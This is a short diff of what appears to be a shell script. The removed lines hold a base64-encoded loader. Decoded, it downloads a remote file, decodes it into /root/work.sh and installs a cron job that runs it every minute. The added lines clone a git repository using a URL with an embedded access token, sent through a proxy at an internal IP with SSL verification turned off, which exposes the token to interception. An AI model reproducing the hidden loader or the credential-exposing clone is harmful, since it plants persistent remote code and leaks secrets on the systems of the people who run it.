@@ -1,5 +1,8 @@
-CgoKY2QgL3Jvb3QvCgpjdXJsIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9SYW5k
-b21JbmNvcnBvcmF0ZWQvY29udGFpbmVycy9tYXN0ZXIvYm90dG9tLnR4dCA+IHRtcC50eHQKCmNh
-dCB0bXAudHh0IHwgYmFzZTY0IC1kID4gL3Jvb3Qvd29yay5zaCAKCmNyb250YWIgLWwgfCB7IGNh
-dDsgZWNobyAiKiAqICogKiAqIC9iaW4vYmFzaCAvcm9vdC93b3JrLnNoIjsgfSB8IGNyb250YWIg
-LQo=
+PX="http://10.239.9.190:443"
+
+REPOURL="https://${USER}:${TOKEN}@github.com/${USER}/${REPO}.git"
+ 
+TMP=`mktemp -d`
+
+echo "CLOSE ${REPOURL} -> ${TMP}"
+GIT_SSL_NO_VERIFY=true HTTPS_PROXY="${PX}" git clone ${REPOURL} ${TMP}
